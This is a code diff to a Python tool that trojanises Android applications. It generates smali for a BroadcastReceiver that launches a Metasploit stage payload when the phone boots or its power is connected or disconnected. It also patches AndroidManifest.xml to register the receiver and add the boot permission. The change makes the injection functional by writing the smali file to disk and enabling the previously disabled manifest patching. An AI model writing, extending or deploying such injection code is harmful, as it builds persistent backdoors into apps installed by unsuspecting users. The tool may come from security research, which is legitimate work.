@@ -1,6 +1,6 @@
 import sys
 sys.path.append('../')
-from apkhandling import manifest_analyzer
+from manifestmanager import manifest_changer
 
 
 
@@ -16,7 +16,7 @@ opdc = False
 obc = False
 
 
-def __fix_manifest(manifest_path):
+def __fix_manifest(manifest_path, package):
     """
     Fixes the AndroidManifest.xml dependent on the specified hooks. Adds neede permissions. Adds needed receiver.
 
@@ -26,21 +26,21 @@ def __fix_manifest(manifest_path):
     global path,obc,opdc,opc
 
     # inject receiver:
-    rec = '    <receiver android:name="malicious.edu.broadcastreceivertest.BroadcastLauncher">\n    <intent-filter>\n'
+    rec = '        <receiver android:name=' + package.replace("/",".") + '.BroadcastLauncher">\n            <intent-filter>\n'
     
     if opc:
-        rec += '            <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>\n'
+        rec += '                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>\n'
     if opdc:
-        rec += '            <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"/>\n'
+        rec += '                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"/>\n'
     if obc:
-        rec += '            <action android:name="android.intent.action.BOOT_COMPLETED"/>\n'
+        rec += '                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n'
     
-    rec += '        </intent-filter>\n    </receiver>'
-    manifest_analyzer.add_receiver(manifest_path, rec)
+    rec += '            </intent-filter>\n    </receiver>'
+    manifest_changer.add_receiver(manifest_path, rec)
 
     # add permissions
     if obc:
-        manifest_analyzer.add_permissions_to_manifest(manifest_path, manifest_path,["android.permission.RECEIVE_BOOT_COMPLETED"])
+        manifest_changer.add_permissions_to_manifest(manifest_path, manifest_path,["android.permission.RECEIVE_BOOT_COMPLETED"])
 
     return
                 
@@ -49,10 +49,10 @@ def __fix_manifest(manifest_path):
 
     pass
 
-def __inject_smali():
+def __inject_smali(package):
     global path
-    replace = ".class public Lmalicious/edu/broadcastreceivertest/BroadcastLauncher;"
-    smali = ".class public L" + path + "/BroadcastLauncher;\n"
+    replace = ".class public L"+package+"/BroadcastLauncher;"
+    smali = ".class public L" +package + "/BroadcastLauncher;\n".replace("//", "/")
     smali += """.super Landroid/content/BroadcastReceiver;
 .source "BroadcastLauncher.java"
 
@@ -73,7 +73,7 @@ def __inject_smali():
 .method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
     .locals 0
     .param p1, "context"    # Landroid/content/Context;
-    .param p2, "intent"    # Landroid/content/Intent;"""
+    .param p2, "intent"    # Landroid/content/Intent;\n"""
 
     invoke = "invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V\n"
     smali += invoke
@@ -84,8 +84,13 @@ def __inject_smali():
 .end method"""
 
     print(smali)
+    
+    with open(path+"BroadcastLauncher.smali","w") as f:
+        f.write(smali)
 
-def inject_broadcast_hook(manifest_path, payload_path, on_power_connected=False, on_power_disconnected=False, on_boot_completed=False):
+    
+
+def inject_broadcast_hook(manifest_path, payload_path, package_path ,on_power_connected=False, on_power_disconnected=False, on_boot_completed=False):
     """
     Injects different hooks into the original application. These hooks are launched on the intents given in the parameters
 
@@ -94,6 +99,9 @@ def inject_broadcast_hook(manifest_path, payload_path, on_power_connected=False,
 
     :param payload_path: path to the folder where the payload is placed
     :type payload_path: str
+
+    :param package_path: package name within the original application(e.g. com/metasploit/stage)
+    :type package_path: str
 
     :param on_power_connected: Inject hook which is launched when the power to the phone is connected
     :type on_power_connected: bool
@@ -115,8 +123,8 @@ def inject_broadcast_hook(manifest_path, payload_path, on_power_connected=False,
     opdc = on_power_disconnected
     obc = on_boot_completed
 
-    __inject_smali()
-    #__fix_manifest(manifest_path)
+    __inject_smali(package_path)
+    __fix_manifest(manifest_path, package_path)
 
     
 
